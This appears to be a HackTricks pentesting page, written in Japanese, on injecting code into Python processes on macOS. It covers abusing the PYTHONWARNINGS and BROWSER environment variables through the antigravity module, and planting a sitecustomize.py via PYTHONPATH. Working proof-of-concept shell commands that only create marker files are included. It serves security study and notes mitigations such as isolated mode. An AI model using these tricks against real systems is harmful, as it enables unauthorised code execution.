# macOS Python Application Injection

{{#include ../../../banners/hacktricks-training.md}}

## `PYTHONWARNINGS` と `BROWSER` 環境変数経由

攻撃者が Python プロセスの環境を制御できる場合、`PYTHONWARNINGS` と `BROWSER` の組み合わせにより、細工した warning オプションの処理中に Python が `antigravity` モジュールを import すると、コマンド実行をトリガーできます。この手法は、`antigravity` が Python の `webbrowser` モジュールで URL を開くことに依存しており、このモジュールは `BROWSER` 環境変数に従います。<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## `PYTHONPATH` と `sitecustomize.py` を介した方法

通常の起動時、Python の `site` module は site-specific なパスを追加し、その後 `sitecustomize` という名前の module の import を試みます。攻撃者が読み取り可能なディレクトリを `PYTHONPATH` の先頭に配置すると、プロセス環境を制御できる攻撃者は、対象の script より前に Python に payload を import させることができます。`-S` flag は自動的な `site` 初期化を無効にします。一方、isolated mode（`-I`）は `PYTHONPATH` を無視し、`-s` と `-E` を暗黙的に有効にします。<sup>[[2]](#references)[[3]](#references)</sup>
```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```
## References

- [1] [Environment VariablesによるHacking - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Site-specific configuration hook](https://docs.python.org/3/library/site.html)
- [3] [Pythonのコマンドラインと環境](https://docs.python.org/3/using/cmdline.html)
{{#include ../../../banners/hacktricks-training.md}}
